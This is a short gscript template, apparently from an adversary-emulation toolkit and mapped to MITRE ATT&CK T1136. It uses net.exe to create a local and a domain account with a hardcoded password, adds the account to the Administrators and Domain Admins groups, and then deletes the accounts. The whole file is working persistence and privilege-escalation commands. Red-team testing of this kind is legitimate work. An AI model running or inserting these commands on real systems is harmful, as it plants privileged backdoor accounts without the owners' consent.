// Example gscript template
// Title: Net User Creation
// Author: ahhh
// Purpose: add a local user, domain user, add them to local administrators and domain administrators groups
// Gscript version: 0.1.1
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1136

//priority:100
//timeout:150

var fn;

function BeforeDeploy() {
  LogInfo("starting execution of Net User Creation");
  return true; 
}

function Deploy() {  
  // Add a local user
  ForkExecuteCommand("net.exe", ["user", "spoderman", "TheAmazing", "/add", "/fullname:Spoder Man"]);
  LogInfo("Added a local user spoderman");

  // Add a domain user
  ForkExecuteCommand("net.exe", ["user", "spoderman", "TheAmazing", "/add", "/fullname:Spoder Man", "/domain"]);
  LogInfo("Added a domain user spoderman");

  // Add the user to Adminsistrators group
  ForkExecuteCommand("net.exe", ["group", "Administrators", "spoderman", "/add"]);
  LogInfo("Added spoderman to the Administrators group");

  // Add the user to the Domain Adminsistrators group
  ForkExecuteCommand("net.exe", ["group", "Domain Admins", "spoderman", "/add", "/domain"]);
  LogInfo("Added spoderman to the Domain Administrators group");

  // Add the user to the Domain Adminsistrators group
  ForkExecuteCommand("net.exe", ["localgroup", "Administrators", "spoderman", "/add"]);
  LogInfo("Added spoderman to the local Administrators group");

  return true;
}

function AfterDeploy() {
  // Removed the local user spoderman
  ForkExecuteCommand("net.exe", ["user", "spoderman", "/delete"]);
  LogInfo("Removed the local user spoderman");

  // Removed the domain user spoderman
  ForkExecuteCommand("net.exe", ["user", "spoderman", "/delete", "/domain"]);
  LogInfo("Removed the local user spoderman");

  LogInfo("done Net User Creation");
  return true;
}